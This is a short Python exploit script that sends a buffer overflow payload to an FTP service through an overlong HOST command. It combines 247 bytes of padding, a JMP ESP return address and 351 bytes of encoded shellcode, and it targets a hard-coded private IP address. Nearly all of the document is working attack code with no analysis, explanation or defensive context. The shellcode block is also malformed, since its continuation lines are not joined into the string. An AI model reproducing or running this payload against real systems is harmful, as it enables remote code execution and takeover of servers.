#!/usr/bin/python
#payload script By :Islam Abd El Hakim

import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#Evil=247*"A"+"BBBB"+262*"c" pointer to  SEH 0286FFC -- SE Handler 0286FFD0
#shell size = 351 bytes
shell="\xdb\xde\xbe\xdf\xb9\xaf\xa0\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x70\x17\x03\x70\x17\x83\x37\x45\x4d\x55\x3b\x5e\x10"
"\x96\xc3\x9f\x75\x1e\x26\xae\xb5\x44\x23\x81\x05\x0e\x61\x2e"
"\xed\x42\x91\xa5\x83\x4a\x96\x0e\x29\xad\x99\x8f\x02\x8d\xb8"
"\x13\x59\xc2\x1a\x2d\x92\x17\x5b\x6a\xcf\xda\x09\x23\x9b\x49"
"\xbd\x40\xd1\x51\x36\x1a\xf7\xd1\xab\xeb\xf6\xf0\x7a\x67\xa1"
"\xd2\x7d\xa4\xd9\x5a\x65\xa9\xe4\x15\x1e\x19\x92\xa7\xf6\x53"
"\x5b\x0b\x37\x5c\xae\x55\x70\x5b\x51\x20\x88\x9f\xec\x33\x4f"
"\xdd\x2a\xb1\x4b\x45\xb8\x61\xb7\x77\x6d\xf7\x3c\x7b\xda\x73"
"\x1a\x98\xdd\x50\x11\xa4\x56\x57\xf5\x2c\x2c\x7c\xd1\x75\xf6"
"\x1d\x40\xd0\x59\x21\x92\xbb\x06\x87\xd9\x56\x52\xba\x80\x3e"
"\x97\xf7\x3a\xbf\xbf\x80\x49\x8d\x60\x3b\xc5\xbd\xe9\xe5\x12"
"\xc1\xc3\x52\x8c\x3c\xec\xa2\x85\xfa\xb8\xf2\xbd\x2b\xc1\x98"
"\x3d\xd3\x14\x0e\x6d\x7b\xc7\xef\xdd\x3b\xb7\x87\x37\xb4\xe8"
"\xb8\x38\x1e\x81\x53\xc3\xc9\x6e\x0b\xca\x0f\x07\x4e\xcc\x0e"
"\x6c\xc7\x2a\x7a\x82\x8e\xe5\x13\x3b\x8b\x7d\x85\xc4\x01\xf8"
"\x85\x4f\xa6\xfd\x48\xb8\xc3\xed\x3d\x48\x9e\x4f\xeb\x57\x34"
"\xe7\x77\xc5\xd3\xf7\xfe\xf6\x4b\xa0\x57\xc8\x85\x24\x4a\x73"
"\x3c\x5a\x97\xe5\x07\xde\x4c\xd6\x86\xdf\x01\x62\xad\xcf\xdf"
"\x6b\xe9\xbb\x8f\x3d\xa7\x15\x76\x94\x09\xcf\x20\x4b\xc0\x87"
"\xb5\xa7\xd3\xd1\xb9\xed\xa5\x3d\x0b\x58\xf0\x42\xa4\x0c\xf4"
"\x3b\xd8\xac\xfb\x96\x58\xdc\xb1\xba\xc9\x75\x1c\x2f\x48\x18"
"\x9f\x9a\x8f\x25\x1c\x2e\x70\xd2\x3c\x5b\x75\x9e\xfa\xb0\x07"
"\x8f\x6e\xb6\xb4\xb0\xba"
Evil=247*"A"+"\x1F\x8C\xB2\x77"+shell
#+360*"c"


                                           #73895E89      JMP ESP


print "\n sending Evil Payload"
s.connect(('192.168.1.3',21)) #connect to the target
data=s.recv(1023)            # recieve data
s.send('HOST'+Evil+'\r\n')   #send the request
s.close()   #close connection

